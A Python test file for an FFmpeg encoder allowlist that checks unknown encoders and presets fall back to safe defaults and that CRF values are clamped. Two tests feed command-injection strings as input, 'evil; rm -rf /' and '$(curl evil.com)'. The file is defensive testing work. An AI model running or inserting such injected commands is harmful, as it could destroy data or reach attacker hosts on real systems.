"""Tests for src/core/auto_presets.py — encoder allowlist enforcement."""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from src.core.auto_presets import (
    ALLOWED_ENCODER_PRESETS,
    ALLOWED_ENCODERS,
    get_encode_args,
)


def test_allowed_encoder_passes_through():
    args = get_encode_args({"encoder": "libx265", "crf": 22, "encoder_preset": "slow"})
    assert "libx265" in args
    assert "slow" in args
    assert args[args.index("-crf") + 1] == "22"


def test_disallowed_encoder_falls_back_to_libx264():
    args = get_encode_args({"encoder": "evil; rm -rf /", "crf": 23, "encoder_preset": "medium"})
    assert "libx264" in args
    assert "evil" not in " ".join(args)
    assert "rm" not in " ".join(args)


def test_disallowed_encoder_preset_falls_back():
    args = get_encode_args({"encoder": "libx264", "encoder_preset": "$(curl evil.com)"})
    assert "$(curl" not in " ".join(args)
    assert "medium" in args


def test_disallowed_preset_with_nvenc_falls_back_to_p5():
    args = get_encode_args({"encoder": "h264_nvenc", "encoder_preset": "garbage"})
    assert "p5" in args
    assert "garbage" not in " ".join(args)


def test_crf_out_of_range_clamped():
    args = get_encode_args({"encoder": "libx264", "crf": 999})
    assert args[args.index("-crf") + 1] == "63"


def test_crf_negative_clamped():
    args = get_encode_args({"encoder": "libx264", "crf": -50})
    assert args[args.index("-crf") + 1] == "0"


def test_crf_non_numeric_falls_back():
    args = get_encode_args({"encoder": "libx264", "crf": "abc"})
    assert args[args.index("-crf") + 1] == "23"


def test_nvenc_encoder_uses_cq_not_crf():
    args = get_encode_args({"encoder": "h264_nvenc", "crf": 22, "encoder_preset": "p5"})
    assert "-cq" in args
    assert args[args.index("-cq") + 1] == "22"


def test_allowed_encoders_includes_common_codecs():
    """Sanity check the allowlist hasn't shrunk."""
    for name in ("libx264", "libx265", "h264_nvenc", "hevc_nvenc"):
        assert name in ALLOWED_ENCODERS


def test_allowed_presets_includes_libx264_named_presets():
    for p in ("ultrafast", "fast", "medium", "slow", "veryslow"):
        assert p in ALLOWED_ENCODER_PRESETS
